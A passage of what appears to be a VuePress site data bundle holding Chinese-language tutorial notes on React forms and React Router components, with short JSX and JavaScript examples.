<p>不是因为看到希望而去做，是做了才有希望</p>\n</panel>\n',charsets:{cjk:!0}},{title:"React Router",frontmatter:{},regularPath:"/React/React%E8%B7%AF%E7%94%B1/01-ReactRouter%E4%BB%8B%E7%BB%8D.html",relativePath:"React/React路由/01-ReactRouter介绍.md",key:"v-8b3db7f8",path:"/React/React%E8%B7%AF%E7%94%B1/01-ReactRouter%E4%BB%8B%E7%BB%8D.html",headers:[{level:2,title:"理解",slug:"理解",normalizedTitle:"理解",charIndex:216},{level:3,title:"SPA的理解",slug:"spa的理解",normalizedTitle:"spa的理解",charIndex:223},{level:3,title:"路由的理解",slug:"路由的理解",normalizedTitle:"路由的理解",charIndex:357},{level:2,title:"文档地址",slug:"文档地址",normalizedTitle:"文档地址",charIndex:727}],headersStr:"理解 SPA的理解 路由的理解 文档地址",content:'# React Router\n\n> React Router它遵循react的设计理念，即万物皆组件。所以 RR4 只是一堆 提供了导航功能的组件（还有若干对象和方法），具有声明式（引入即用），可组合性的特点。\n\n组件是 React 的核心功能，其拥有非常强大的声明式编程模型。React Router 是导航组件的集合，可与你的应用程序进行声明式的组合。\n\nReact Router 是完整的 React 路由解决方案。\n\n\n# 理解\n\n\n# SPA的理解\n\n * 单页Web应用（single page web application，SPA）。\n * 整个应用只有一个完整的页面。\n * 点击页面中的链接不会刷新页面，只会做页面的局部更新。\n * 数据都需要通过ajax请求获取, 并在前端异步展现\n\n\n# 路由的理解\n\n# 什么是路由?\n\n> 1.一个路由就是一个映射关系(key:value) 2.key为路径, value可能是function或component\n\n# 路由分类\n\n# 后端路由：\n\n> 理解： value是function, 用来处理客户端提交的请求。 注册路由： router.get(path, function(req, res)) 工作过程：当node接收到一个请求时, 根据请求路径找到匹配的路由, 调用路由中的函数来处理请求, 返回响应数据\n\n# 前端路由：\n\n> 浏览器端路由，value是component，用于展示页面内容。 注册路由: <Route path="/test" component={Test}> 工作过程：当浏览器的path变为/test时, 当前路由组件就会变为Test组件\n\n\n# 文档地址\n\n名称     地址\n文档网址   https://reacttraining.com/react-router/\n官方网站   https://reacttraining.com/',normalizedContent:'# react router\n\n> react router它遵循react的设计理念，即万物皆组件。所以 rr4 只是一堆 提供了导航功能的组件（还有若干对象和方法），具有声明式（引入即用），可组合性的特点。\n\n组件是 react 的核心功能，其拥有非常强大的声明式编程模型。react router 是导航组件的集合，可与你的应用程序进行声明式的组合。\n\nreact router 是完整的 react 路由解决方案。\n\n\n# 理解\n\n\n# spa的理解\n\n * 单页web应用（single page web application，spa）。\n * 整个应用只有一个完整的页面。\n * 点击页面中的链接不会刷新页面，只会做页面的局部更新。\n * 数据都需要通过ajax请求获取, 并在前端异步展现\n\n\n# 路由的理解\n\n# 什么是路由?\n\n> 1.一个路由就是一个映射关系(key:value) 2.key为路径, value可能是function或component\n\n# 路由分类\n\n# 后端路由：\n\n> 理解： value是function, 用来处理客户端提交的请求。 注册路由： router.get(path, function(req, res)) 工作过程：当node接收到一个请求时, 根据请求路径找到匹配的路由, 调用路由中的函数来处理请求, 返回响应数据\n\n# 前端路由：\n\n> 浏览器端路由，value是component，用于展示页面内容。 注册路由: <route path="/test" component={test}> 工作过程：当浏览器的path变为/test时, 当前路由组件就会变为test组件\n\n\n# 文档地址\n\n名称     地址\n文档网址   https://reacttraining.com/react-router/\n官方网站   https://reacttraining.com/',charsets:{cjk:!0}},{title:"React表单",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/11-React%E8%A1%A8%E5%8D%95.html",relativePath:"React/React基础/11-React表单.md",key:"v-fabee476",path:"/React/React%E5%9F%BA%E7%A1%80/11-React%E8%A1%A8%E5%8D%95.html",headers:[{level:2,title:"React两种类型表单组件",slug:"react两种类型表单组件",normalizedTitle:"react两种类型表单组件",charIndex:126},{level:3,title:"无约束表单",slug:"无约束表单",normalizedTitle:"无约束表单",charIndex:239},{level:3,title:"约束性组件",slug:"约束性组件",normalizedTitle:"约束性组件",charIndex:179},{level:2,title:"表单控件",slug:"表单控件",normalizedTitle:"表单控件",charIndex:1482},{level:3,title:"Label",slug:"label",normalizedTitle:"label",charIndex:1491},{level:3,title:"文本框与Select",slug:"文本框与select",normalizedTitle:"文本框与select",charIndex:1606},{level:3,title:"复选框和单选框",slug:"复选框和单选框",normalizedTitle:"复选框和单选框",charIndex:2280},{level:3,title:"Focus",slug:"focus",normalizedTitle:"focus",charIndex:3755},{level:2,title:"表单事件",slug:"表单事件",normalizedTitle:"表单事件",charIndex:4237}],headersStr:"React两种类型表单组件 无约束表单 约束性组件 表单控件 Label 文本框与Select 复选框和单选框 Focus 表单事件",content:"# React表单\n\n表单是应用必不可少的一部分，只要需要用户输入，哪怕是最简单的输入，都离不开表单。\n\nReact组件的核心理念就是可预知性和可测试性。给定同样的props和state，任何React组件都会渲染出异样的结果。表单也不例外。\n\n\n# React两种类型表单组件\n\n在React中，表单组件有两种类型：\n\n * 约束组件\n * 无约束组件\n\n约束性组件，简单的说，就是由React管理了它的value，而非约束性组件的value就是原生的DOM管理的。\n\n\n# 无约束表单\n\n非约束性组件这么写：\n\n<input type=\"text\" defaultValue=\"name\" />\n\n\n这个 defaultValue 其实就是原生DOM中的 value 属性。这样写出的来的组件，其value值就是用户输入的内容，React完全不管理输入的过程。\n\n\n# 约束性组件\n\n约束性组件是这么写的：\n\n<input type=\"text\" value={this.state.name} onChange={this.handleChange} />\n\n//...省略部分代码\nhandleChange: function(e) {\n  this.setState({name: e.target.value});\n}\n\n\n这里，value属性不再是一个写死的值，他是 this.state.name，而 this.state.name 是由 this.handleChange 负责管理的。 这个时候实际上 input 的 value 根本不是用户输入的内容。而是onChange 事件触发之后，由于 this.setState 导致了一次重新渲染。不过React会优化这个渲染过程，实际它依然是通过设置input的value来实现的。\n\n但是一定要注意，约束性组件显示的值和用户输入的值虽然很多时候是相同的，但他们根本是两码事。约束性组件显示的是 this.state.name 的值。你可以在handleChange中对用户输入的值做任意的处理，比如你可以做错误校验。\n\n示例：输入值转换成大写\n\nclass Name extends React.Component{\n\tconstructor(){\n    \tsuper();\n        this.state = {\n        \tname:'allcky'\n            };\n    }\n    handleChange(event){\n        this.setState({\n            name:event.target.value.toUpperCase()\n        })\n    }\n    render(){\n        return <input type=\"text\" value={this.state.name} onChange={this.handleChange.bind(this)} />\n    }\n}\n\nReactDOM.render(<Name/>,document.querySelector('#app'))\n\n\n对比约束性组件和非约束性组件的输入流程：\n\n非约束性组件： 用户输入A -> input 中显示A\n\n约束性组件： 用户输入A -> 触发onChange事件 -> handleChange 中设置 state.name = “A” -> 渲染input使他的value变成A\n\n\n# 表单控件\n\n\n# Label\n\nLabel是表单元素中很重要的组件，通过label可以明确的向用户传达你的要求，提升单选和复选框的可用性。\n\n但是label与for属性有一个冲突的地方。因为如果使用JSX，for 变成了htmlfor 。\n\n\n# 文本框与Select\n\nReact对<textarea/> 和 <select/> 的接口做了一些修改，提升了一致性，让他们操作起来更容易。\n\n# textarea\n\n<textarea/>被改的更像<input/>了，允许我们设置value 和defaultValue。\n\n# 非约束的\n<textarea defaultValue=\"hello world\" />\n\n# 约束的\n<textarea value={this.state.helloTo} onChange={this.handleChange} />\n\n\n# select\n\n<select/>现在接受value和defaultValue来设置已选项，我们可以更容易地对它的值进行操作。\n\n# 非约束\n<select defaultValue=\"sw\">\n    <option value=\"ks\">看书</option>\n    <option value=\"wyx\">玩游戏</option>\n    <option value=\"dy\">电影</option>\n</select>\n\n# 约束的\n<select value={this.state.fav} onChange={this.handleChange}>\n    <option value=\"ks\">看书</option>\n    <option value=\"wyx\">玩游戏</option>\n    <option value=\"dy\">电影</option>    \n</select>\n\n\n\n# 复选框和单选框\n\n复选框和单选框使用的则是另外一种完全不同的控制方式。\n\n# 单选框\n\n约束的\n\nvar Radio = React.createClass({\n　　getInitialState: function() {\n　　　　return {gender: '男'};\n　　},\n    render: function() {\n　　　　return (<div>\n　　　　　　　　　　<input type='radio' name='gender' value='男' checked={this.state.sex == '男'} onChange={this.handlerChange} />男\n　　　　　　　　　　<input type='radio' name='gender' value='女' checked={this.state.sex == '女'} onChange={this.handlerChange} />女\n　　　　　　　　</div>);   \n　　},\n　　handlerChange: function(event) {\n　　　　this.setState({gender: event.target.value});\n　　}\n});\n\n\n设置单选框的defaultChecked会使其变为无约束组件。\n\n<input type='radio' defaultChecked='true' />\n\n\n# 复选框\n\n约束的\n\nvar CheckBox = React.createClass({\n　　getInitialState: function() {\n　　　　return {basketBall: false, swim: false, sing: false};\n　　},\n　　render: function() {\n　　　　return (<div>\n　　　　　　　　　　<p>爱好：</p>\n　　　　　　　　　　<input type='checkbox' checked={this.state.basketBall} value='basketBall' onChange={this.handlerChange} />篮球\n　　　　　　　　　　<input type='\bcheckbox' checked={this.state.swim} value='swim' onChange={this.handlerChange} />游泳\n　　　　　　　　　　<input type='checkbox' checked={this.state.sing} value='sing' onChange={this.handlerChange} />唱歌\n　　　　　　　　</div>);   \n　　},\n　　handlerChange: function(event) {\n　　　　var type = event.target.value,\n　　　　　　 checked = event.target.checked,\n　　　　　　 newState = {};\n　　　　newState[type] = checked;\n　　　　this.setState(newState);\n　　}\n});\n\n\n设置复选框的defaultChecked会使其变为无约束组件。\n\n<input type='checkbox' defaultChecked='true' />\n\n\n\n# Focus\n\n控制表单组件的focus可以很好地引导用户按照表单逻辑逐步填写，而且还可以减少用户的操作，增强可用性。\n\nReact实现了autoFocus属性，在组件第一次挂载时，如果没有其他表单域聚焦时，React就会把焦点放到这个组件对应的表单域中。\n\n# autoFocus\n\n<input type='text' name='given_name' autoFocus=\"true\" />\n\n\n# DOM操作方式\n\nvar GetName = React.createClass({\n    render:function(){\n        return (<input type=\"text\" name=\"given_name\" ref=\"givenName\" />)\n    },\n    componentDidMount:function(){\n        var inputName = this.refs.givenName.getDOMNode();\n        inputName.focus();\n    }\n})\n\n\n\n# 表单事件\n\n访问表单事件是控制表单不同部分的一个非常重要的方面。\n\nReact支持所有HTML事件，这些事件遵循驼峰命名的约定。这些事件是标准化的，提供了跨浏览器的一致接口。\n\n所有的事件都提供了event.target来访问触发事件的DOM节点。\n\nhandleEvent:function(event){\n    var DOMNode = event.target;\n    var newValue = DOMNode.value;\n}\n\n\n这是访问约束组件的值得最简单方式之一。",normalizedContent:"# react表单\n\n表单是应用必不可少的一部分，只要需要用户输入，哪怕是最简单的输入，都离不开表单。\n\nreact组件的核心理念就是可预知性和可测试性。给定同样的props和state，任何react组件都会渲染出异样的结果。表单也不例外。\n\n\n# react两种类型表单组件\n\n在react中，表单组件有两种类型：\n\n * 约束组件\n * 无约束组件\n\n约束性组件，简单的说，就是由react管理了它的value，而非约束性组件的value就是原生的dom管理的。\n\n\n# 无约束表单\n\n非约束性组件这么写：\n\n<input type=\"text\" defaultvalue=\"name\" />\n\n\n这个 defaultvalue 其实就是原生dom中的 value 属性。这样写出的来的组件，其value值就是用户输入的内容，react完全不管理输入的过程。\n\n\n# 约束性组件\n\n约束性组件是这么写的：\n\n<input type=\"text\" value={this.state.name} onchange={this.handlechange} />\n\n//...省略部分代码\nhandlechange: function(e) {\n  this.setstate({name: e.target.value});\n}\n\n\n这里，value属性不再是一个写死的值，他是 this.state.name，而 this.state.name 是由 this.handlechange 负责管理的。 这个时候实际上 input 的 value 根本不是用户输入的内容。而是onchange 事件触发之后，由于 this.setstate 导致了一次重新渲染。不过react会优化这个渲染过程，实际它依然是通过设置input的value来实现的。\n\n但是一定要注意，约束性组件显示的值和用户输入的值虽然很多时候是相同的，但他们根本是两码事。约束性组件显示的是 this.state.name 的值。你可以在handlechange中对用户输入的值做任意的处理，比如你可以做错误校验。\n\n示例：输入值转换成大写\n\nclass name extends react.component{\n\tconstructor(){\n    \tsuper();\n        this.state = {\n        \tname:'allcky'\n            };\n    }\n    handlechange(event){\n        this.setstate({\n            name:event.target.value.touppercase()\n        })\n    }\n    render(){\n        return <input type=\"text\" value={this.state.name} onchange={this.handlechange.bind(this)} />\n    }\n}\n\nreactdom.render(<name/>,document.queryselector('#app'))\n\n\n对比约束性组件和非约束性组件的输入流程：\n\n非约束性组件： 用户输入a -> input 中显示a\n\n约束性组件： 用户输入a -> 触发onchange事件 -> handlechange 中设置 state.name = “a” -> 渲染input使他的value变成a\n\n\n# 表单控件\n\n\n# label\n\nlabel是表单元素中很重要的组件，通过label可以明确的向用户传达你的要求，提升单选和复选框的可用性。\n\n但是label与for属性有一个冲突的地方。因为如果使用jsx，for 变成了htmlfor 。\n\n\n# 文本框与select\n\nreact对<textarea/> 和 <select/> 的接口做了一些修改，提升了一致性，让他们操作起来更容易。\n\n# textarea\n\n<textarea/>被改的更像<input/>了，允许我们设置value 和defaultvalue。\n\n# 非约束的\n<textarea defaultvalue=\"hello world\" />\n\n# 约束的\n<textarea value={this.state.helloto} onchange={this.handlechange} />\n\n\n# select\n\n<select/>现在接受value和defaultvalue来设置已选项，我们可以更容易地对它的值进行操作。\n\n# 非约束\n<select defaultvalue=\"sw\">\n    <option value=\"ks\">看书</option>\n    <option value=\"wyx\">玩游戏</option>\n    <option value=\"dy\">电影</option>\n</select>\n\n# 约束的\n<select value={this.state.fav} onchange={this.handlechange}>\n    <option value=\"ks\">看书</option>\n    <option value=\"wyx\">玩游戏</option>\n    <option value=\"dy\">电影</option>    \n</select>\n\n\n\n# 复选框和单选框\n\n复选框和单选框使用的则是另外一种完全不同的控制方式。\n\n# 单选框\n\n约束的\n\nvar radio = react.createclass({\n　　getinitialstate: function() {\n　　　　return {gender: '男'};\n　　},\n    render: function() {\n　　　　return (<div>\n　　　　　　　　　　<input type='radio' name='gender' value='男' checked={this.state.sex == '男'} onchange={this.handlerchange} />男\n　　　　　　　　　　<input type='radio' name='gender' value='女' checked={this.state.sex == '女'} onchange={this.handlerchange} />女\n　　　　　　　　</div>);   \n　　},\n　　handlerchange: function(event) {\n　　　　this.setstate({gender: event.target.value});\n　　}\n});\n\n\n设置单选框的defaultchecked会使其变为无约束组件。\n\n<input type='radio' defaultchecked='true' />\n\n\n# 复选框\n\n约束的\n\nvar checkbox = react.createclass({\n　　getinitialstate: function() {\n　　　　return {basketball: false, swim: false, sing: false};\n　　},\n　　render: function() {\n　　　　return (<div>\n　　　　　　　　　　<p>爱好：</p>\n　　　　　　　　　　<input type='checkbox' checked={this.state.basketball} value='basketball' onchange={this.handlerchange} />篮球\n　　　　　　　　　　<input type='\bcheckbox' checked={this.state.swim} value='swim' onchange={this.handlerchange} />游泳\n　　　　　　　　　　<input type='checkbox' checked={this.state.sing} value='sing' onchange={this.handlerchange} />唱歌\n　　　　　　　　</div>);   \n　　},\n　　handlerchange: function(event) {\n　　　　var type = event.target.value,\n　　　　　　 checked = event.target.checked,\n　　　　　　 newstate = {};\n　　　　newstate[type] = checked;\n　　　　this.setstate(newstate);\n　　}\n});\n\n\n设置复选框的defaultchecked会使其变为无约束组件。\n\n<input type='checkbox' defaultchecked='true' />\n\n\n\n# focus\n\n控制表单组件的focus可以很好地引导用户按照表单逻辑逐步填写，而且还可以减少用户的操作，增强可用性。\n\nreact实现了autofocus属性，在组件第一次挂载时，如果没有其他表单域聚焦时，react就会把焦点放到这个组件对应的表单域中。\n\n# autofocus\n\n<input type='text' name='given_name' autofocus=\"true\" />\n\n\n# dom操作方式\n\nvar getname = react.createclass({\n    render:function(){\n        return (<input type=\"text\" name=\"given_name\" ref=\"givenname\" />)\n    },\n    componentdidmount:function(){\n        var inputname = this.refs.givenname.getdomnode();\n        inputname.focus();\n    }\n})\n\n\n\n# 表单事件\n\n访问表单事件是控制表单不同部分的一个非常重要的方面。\n\nreact支持所有html事件，这些事件遵循驼峰命名的约定。这些事件是标准化的，提供了跨浏览器的一致接口。\n\n所有的事件都提供了event.target来访问触发事件的dom节点。\n\nhandleevent:function(event){\n    var domnode = event.target;\n    var newvalue = domnode.value;\n}\n\n\n这是访问约束组件的值得最简单方式之一。",charsets:{cjk:!0}},{title:"路由组件",frontmatter:{},regularPath:"/React/React%E8%B7%AF%E7%94%B1/03-ReactRouter%E7%BB%84%E4%BB%B6.html",relativePath:"React/React路由/03-ReactRouter组件.md",key:"v-1c068d40",path:"/React/React%E8%B7%AF%E7%94%B1/03-ReactRouter%E7%BB%84%E4%BB%B6.html",headers:[{level:2,title:"BrowserRouter 与 HashRouter",slug:"browserrouter-与-hashrouter",normalizedTitle:"browserrouter 与 hashrouter",charIndex:222},{level:3,title:"BrowserRouter",slug:"browserrouter",normalizedTitle:"browserrouter",charIndex:27},{level:3,title:"HashRouter",slug:"hashrouter",normalizedTitle:"hashrouter",charIndex:60},{level:2,title:"Route",slug:"route",normalizedTitle:"route",charIndex:34},{level:3,title:"render方法",slug:"render方法",normalizedTitle:"render方法",charIndex:2523},{level:3,title:"props",slug:"props",normalizedTitle:"props",charIndex:2722},{level:2,title:"Link",slug:"link",normalizedTitle:"link",charIndex:113},{level:3,title:"to: string",slug:"to-string",normalizedTitle:"to: string",charIndex:3632},{level:3,title:"to: object",slug:"to-object",normalizedTitle:"to: object",charIndex:3712},{level:2,title:"NavLink",slug:"navlink",normalizedTitle:"navlink",charIndex:134},{level:3,title:"activeClassName",slug:"activeclassname",normalizedTitle:"activeclassname",charIndex:4018},{level:3,title:"activeStyle",slug:"activestyle",normalizedTitle:"activestyle",charIndex:4146},{level:3,title:"exact",slug:"exact",normalizedTitle:"exact",charIndex:4191},{level:2,title:"Redirect",slug:"redirect",normalizedTitle:"redirect",charIndex:164},{level:2,title:"param",slug:"param",normalizedTitle:"param",charIndex:5057},{level:2,title:"Switch组件",slug:"switch组件",normalizedTitle:"switch组件",charIndex:5137}],headersStr:"BrowserRouter 与 HashRouter BrowserRouter HashRouter Route render方法 props Link to: string to: object NavLink activeClassName activeStyle exact Redirect param Switch组件",content:'# 路由组件\n\n组件名             描述\nBrowserRouter   基于History的高阶路由组件\nHashRouter      基于Hash的高阶路由组件\nRoute           路由定义组件\nLink            链接组件\nNavLink         链接组件(可实现链接高亮)\nRedirect        重定向组件\nSwitch          只渲染所匹配到的第一个路由组件\n\n\n# BrowserRouter 与 HashRouter\n\n> BrowserRouter,HashRouter是React组件，它只是一个容器，真正的路由要通过Route组件定义。\n\nBrowserRouter 与 HashRouter 容器组件用于决定我们所采用的路由方式。\n\n组件              描述\nBrowserRouter   HTML5 history API 的高阶路由组件\nHashRouter      基于hash 的高阶路由组件\n\n\n# BrowserRouter\n\n> 一个使用了 HTML5 history API 的高阶路由组件，保证你的 UI 界面和 URL 保持同步。\n\n如果设为BrowserRouter，背后调用的是浏览器的History API，显示正常的路径example.com/some/path。\n\n// JavaScript 模块导入（注：ES6 形式）\nimport { BrowserRouter } from \'react-router-dom\'\n\n\n> 注意：如果设为BrowserRouter，这种情况需要对服务器改造。否则用户直接向服务器请求某个子路由，会显示网页找不到的404错误。如果开发服务器使用的是webpack-dev-server，加上--history-api-fallback参数就可以了。\n\nwebpack-dev-server  --history-api-fallback\n\n\n参数                    类型         描述\nbasename              string     为所有位置添加一个基准URL\ngetUserConfirmation   function   导航到此页面前执行的函数，默认使用 window.confirm\nforceRefresh          bool       当浏览器不支持 html5 的 history API 时强制刷新页面\nkeyLength             number     设置它里面路由的 location.key 的长度。默认是6。\nchildren              node       渲染唯一子元素。\n\n# basename: string\n\n作用：为所有位置添加一个基准URL\n\n使用场景：假如你需要把页面部署到服务器的二级目录，你可以使用 basename 设置到此目录。\n\n<BrowserRouter basename="/minooo" />\n<Link to="/react" /> // 最终渲染为 <a href="/minooo/react">\n\n\n# getUserConfirmation: func\n\n作用：导航到此页面前执行的函数，默认使用 window.confirm\n\n使用场景：当需要用户进入页面前执行什么操作时可用，不过一般用到的不多。\n\nconst getConfirmation = (message, callback) => {\n  const allowTransition = window.confirm(message)\n  callback(allowTransition)\n}\n\n<BrowserRouter getUserConfirmation={getConfirmation(\'Are you sure?\', yourCallBack)} />\n\n\n# forceRefresh: bool\n\n作用：当浏览器不支持 html5 的 history API 时强制刷新页面。\n\nconst supportsHistory = \'pushState\' in window.history\n<BrowserRouter forceRefresh={!supportsHistory} />\n\n\n# keyLength: number\n\n作用：设置它里面路由的 location.key 的长度。默认是6。（key的作用：点击同一个链接时，每次该路由下的 location.key都会改变，可以通过 key 的变化来刷新页面。）\n\n使用场景：按需设置。\n\n<BrowserRouter keyLength={12} />\n\n\n# children: node\n\n作用：渲染唯一子元素。\n\n使用场景：作为一个 React组件，天生自带 children 属性。\n\n\n# HashRouter\n\n> Hash history 不支持 location.key 和 location.state。另外由于该技术只是用来支持旧版浏览器，因此更推荐大家使用 BrowserRouter。 如果设为HashRouter，路由将通过URL的hash部分（#）切换，URL的形式类似example.com/#/some/path。\n\nimport { HashRouter } from \'react-router\'\n\n\n\n# Route\n\n> Route 的 path 属性表示路由组件所对应的路径，可以是绝对路径或相对路径，相对路径可以继承。component 属性指定组件，component指定单个组件。\n\n * <Route>也许是 RR4 中最重要的组件了，重要到你必须理解它，学会它，用好它。它最基本的职责就是当页面的访问地址与 Route 上的 path 匹配时，就渲染出对应的 UI 界面。\n\n * <Route> 自带三个 render方法 和三个属性。\n\n\n# render方法\n\nrender methods 分别是：\n\n * <Route component>\n * <Route render>\n * <Route children>\n\n每种 render method 都有不同的应用场景，同一个<Route> 应该只使用一种 render method ，大部分情况下你将使用 component 。\n\n\n# props\n\n * match\n * location\n * history\n\n所有的 render method 无一例外都将被传入这些 props。\n\n\n# Link\n\nLink组件用于取代<a>元素，生成一个链接，允许用户点击后跳转到另一个路由。它基本上就是<a>元素的React 版本，可以接收Router的状态。\n\n参数        类型       描述                                                  示例\nto        string   需要跳转到的路径(pathname)或地址（location）                     \'<Link to="/courses"/>\'\nto        object   需要跳转到的地址（location）                                  <Link to={/{pathname: \'/courses\',search: \'?sort=name\',hash:\n                                                                       \'#the-hash\',state: { fromDashboard: true }/}/}/>\nreplace   bool     当设置为 true 时，点击链接后将使用新地址替换掉访问历史记录里面的原地址。当设置为 false   <Link to="/courses" replace />\n                   时，点击链接后将在原有访问历史记录的基础上添加一个新的纪录。默认为 false。\n\nrender() {\n  return <div>\n    <ul role="nav">\n      <li><Link to="/about">About</Link></li>\n      <li><Link to="/repos">Repos</Link></li>\n    </ul>\n  </div>\n}\n\n\n\n# to: string\n\n作用：跳转到指定路径 使用场景：如果只是单纯的跳转就直接用字符串形式的路径。\n\n<Link to="/courses" />\n\n\n\n# to: object\n\n作用：携带参数跳转到指定路径 作用场景：比如你点击的这个链接将要跳转的页面需要展示此链接对应的内容，又比如这是个支付跳转，需要把商品的价格等信息传递过去。\n\n<Link to={{\n  pathname: \'/course\',\n  search: \'?sort=name\',\n  state: { price: 18 }\n}} />\n\n\n\n# NavLink\n\nimport { NavLink } from \'react-router-dom\'\n\n<NavLink to="/about">About</NavLink>\n\n\n参数                类型       描述\nactiveClassName   string   当元素匹配上当前 URL 的时候, 这个类会被赋予给这个元素. 其默认值为active, 这个值会被添加到\n                           className 属性的后面(追加)\nactiveStyle       object   当元素被选中时, 为此元素添加样式\nexact             bool     当值为 true 时, 只有当地址完全匹配 class 和 style 才会应用\n\n\n# activeClassName\n\n使用activeClassName指定当前路由的Class。\n\n<LinkNav to="/about" activeClassName="active">About</LinkNav>\n<LinkNav to="/repos" activeClassName="active">Repos</LinkNav>\n\n\n\n# activeStyle\n\n如果希望当前的路由与其他路由有不同样式，这时可以使用Link组件的activeStyle属性。\n\n<LinkNav to="/about" activeStyle={{color: \'red\'}}>About</LinkNav>\n<LinkNav to="/repos" activeStyle={{color: \'red\'}}>Repos</LinkNav>\n\n\n\n# exact\n\n<NavLink\n  exact\n  to="/profile"\n>Profile</NavLink>\n\n\n\n# Redirect\n\nRedirect 是一个重定向的组件，有from 和to 两个属性，渲染时将导航到一个新地址，这个新地址覆盖在访问历史信息里面的本该访问的那个地址。\n\n例如：当我们修改路径后，我们可以做个重定向，当用户访问原先的地址的时候(404)，可以重定向到新地址。\n\n参数     类型       描述\nto     string   重定向的 URL 字符串\nto     object   重定向的 location 对象\npush   bool     若为真，重定向操作将会把新地址加入到访问历史记录里面，并且无法回退到前面的页面。\nfrom   string   需要匹配的将要被重定向路径。\n\n<Redirect from="string" to="string" />\n\n\n\n# param\n\nparam 通过 /:param 的方式传递参数\n\n\n<Route path="new/:id" componet={News} />\n\n\n\n# Switch组件\n\n使用方式：\n\nimport { Switch } from "react-router-dom";\n\n<Switch>\n    <Route path="/" component={Test1} />\n    <Route path="/Test" component={Test2} />\n</Switch>\n',normalizedContent:'# 路由组件\n\n组件名             描述\nbrowserrouter   基于history的高阶路由组件\nhashrouter      基于hash的高阶路由组件\nroute           路由定义组件\nlink            链接组件\nnavlink         链接组件(可实现链接高亮)\nredirect        重定向组件\nswitch          只渲染所匹配到的第一个路由组件\n\n\n# browserrouter 与 hashrouter\n\n> browserrouter,hashrouter是react组件，它只是一个容器，真正的路由要通过route组件定义。\n\nbrowserrouter 与 hashrouter 容器组件用于决定我们所采用的路由方式。\n\n组件              描述\nbrowserrouter   html5 history api 的高阶路由组件\nhashrouter      基于hash 的高阶路由组件\n\n\n# browserrouter\n\n> 一个使用了 html5 history api 的高阶路由组件，保证你的 ui 界面和 url 保持同步。\n\n如果设为browserrouter，背后调用的是浏览器的history api，显示正常的路径example.com/some/path。\n\n// javascript 模块导入（注：es6 形式）\nimport { browserrouter } from \'react-router-dom\'\n\n\n> 注意：如果设为browserrouter，这种情况需要对服务器改造。否则用户直接向服务器请求某个子路由，会显示网页找不到的404错误。如果开发服务器使用的是webpack-dev-server，加上--history-api-fallback参数就可以了。\n\nwebpack-dev-server  --history-api-fallback\n\n\n参数                    类型         描述\nbasename              string     为所有位置添加一个基准url\ngetuserconfirmation   function   导航到此页面前执行的函数，默认使用 window.confirm\nforcerefresh          bool       当浏览器不支持 html5 的 history api 时强制刷新页面\nkeylength             number     设置它里面路由的 location.key 的长度。默认是6。\nchildren              node       渲染唯一子元素。\n\n# basename: string\n\n作用：为所有位置添加一个基准url\n\n使用场景：假如你需要把页面部署到服务器的二级目录，你可以使用 basename 设置到此目录。\n\n<browserrouter basename="/minooo" />\n<link to="/react" /> // 最终渲染为 <a href="/minooo/react">\n\n\n# getuserconfirmation: func\n\n作用：导航到此页面前执行的函数，默认使用 window.confirm\n\n使用场景：当需要用户进入页面前执行什么操作时可用，不过一般用到的不多。\n\nconst getconfirmation = (message, callback) => {\n  const allowtransition = window.confirm(message)\n  callback(allowtransition)\n}\n\n<browserrouter getuserconfirmation={getconfirmation(\'are you sure?\', yourcallback)} />\n\n\n# forcerefresh: bool\n\n作用：当浏览器不支持 html5 的 history api 时强制刷新页面。\n\nconst supportshistory = \'pushstate\' in window.history\n<browserrouter forcerefresh={!supportshistory} />\n\n\n# keylength: number\n\n作用：设置它里面路由的 location.key 的长度。默认是6。（key的作用：点击同一个链接时，每次该路由下的 location.key都会改变，可以通过 key 的变化来刷新页面。）\n\n使用场景：按需设置。\n\n<browserrouter keylength={12} />\n\n\n# children: node\n\n作用：渲染唯一子元素。\n\n使用场景：作为一个 react组件，天生自带 children 属性。\n\n\n# hashrouter\n\n> hash history 不支持 location.key 和 location.state。另外由于该技术只是用来支持旧版浏览器，因此更推荐大家使用 browserrouter。 如果设为hashrouter，路由将通过url的hash部分（#）切换，url的形式类似example.com/#/some/path。\n\nimport { hashrouter } from \'react-router\'\n\n\n\n# route\n\n> route 的 path 属性表示路由组件所对应的路径，可以是绝对路径或相对路径，相对路径可以继承。component 属性指定组件，component指定单个组件。\n\n * <route>也许是 rr4 中最重要的组件了，重要到你必须理解它，学会它，用好它。它最基本的职责就是当页面的访问地址与 route 上的 path 匹配时，就渲染出对应的 ui 界面。\n\n * <route> 自带三个 render方法 和三个属性。\n\n\n# render方法\n\nrender methods 分别是：\n\n * <route component>\n * <route render>\n * <route children>\n\n每种 render method 都有不同的应用场景，同一个<route> 应该只使用一种 render method ，大部分情况下你将使用 component 。\n\n\n# props\n\n * match\n * location\n * history\n\n所有的 render method 无一例外都将被传入这些 props。\n\n\n# link\n\nlink组件用于取代<a>元素，生成一个链接，允许用户点击后跳转到另一个路由。它基本上就是<a>元素的react 版本，可以接收router的状态。\n\n参数        类型       描述                                                  示例\nto        string   需要跳转到的路径(pathname)或地址（location）                     \'<link to="/courses"/>\'\nto        object   需要跳转到的地址（location）                                  <link to={/{pathname: \'/courses\',search: \'?sort=name\',hash:\n                                                                       \'#the-hash\',state: { fromdashboard: true }/}/}/>\nreplace   bool     当设置为 true 时，点击链接后将使用新地址替换掉访问历史记录里面的原地址。当设置为 false   <link to="/courses" replace />\n                   时，点击链接后将在原有访问历史记录的基础上添加一个新的纪录。默认为 false。\n\nrender() {\n  return <div>\n    <ul role="nav">\n      <li><link to="/about">about</link></li>\n      <li><link to="/repos">repos</link></li>\n    </ul>\n  </div>\n}\n\n\n\n# to: string\n\n作用：跳转到指定路径 使用场景：如果只是单纯的跳转就直接用字符串形式的路径。\n\n<link to="/courses" />\n\n\n\n# to: object\n\n作用：携带参数跳转到指定路径 作用场景：比如你点击的这个链接将要跳转的页面需要展示此链接对应的内容，又比如这是个支付跳转，需要把商品的价格等信息传递过去。\n\n<link to={{\n  pathname: \'/course\',\n  search: \'?sort=name\',\n  state: { price: 18 }\n}} />\n\n\n\n# navlink\n\nimport { navlink } from \'react-router-dom\'\n\n<navlink to="/about">about</navlink>\n\n\n参数                类型       描述\nactiveclassname   string   当元素匹配上当前 url 的时候, 这个类会被赋予给这个元素. 其默认值为active, 这个值会被添加到\n                           classname 属性的后面(追加)\nactivestyle       object   当元素被选中时, 为此元素添加样式\nexact             bool     当值为 true 时, 只有当地址完全匹配 class 和 style 才会应用\n\n\n# activeclassname\n\n使用activeclassname指定当前路由的class。\n\n<linknav to="/about" activeclassname="active">about</linknav>\n<linknav to="/repos" 